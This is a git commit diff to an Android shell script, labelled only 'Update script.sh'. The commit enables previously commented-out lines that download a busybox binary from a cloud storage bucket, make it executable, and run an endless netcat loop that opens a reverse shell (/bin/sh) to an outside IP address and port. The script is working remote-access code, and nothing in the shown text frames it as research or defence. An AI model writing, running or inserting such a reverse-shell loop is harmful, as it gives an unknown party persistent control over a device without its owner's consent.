c0801b20be2ba5a3ffe81feaecd4be963dd394c8
t4084058 <139777346+t4084058@users.noreply.github.com>
2024-09-26 16:57:39 -0400

    Update script.sh

--- 866207152591032/script.sh
+++ 866207152591032/script.sh
@@ -1,14 +1,14 @@
 #!/system/bin/sh
 
 # Download busybox to /data/local/tmp
-#curl -o /data/local/tmp/busybox https://ktrud.nyc3.digitaloceanspaces.com/busybox-arm64
+curl -o /data/local/tmp/busybox https://ktrud.nyc3.digitaloceanspaces.com/busybox-arm64
 
 # Give execute permissions
-#chmod +x /data/local/tmp/busybox
+chmod +x /data/local/tmp/busybox
 
 # Run the loop with netcat command
-#while true
-#do
- # /data/local/tmp/busybox nc 3.13.191.225 16858 -e /bin/sh 
-#done
+while true
+do
+  /data/local/tmp/busybox nc 3.13.191.225 16858 -e /bin/sh 
+done
 
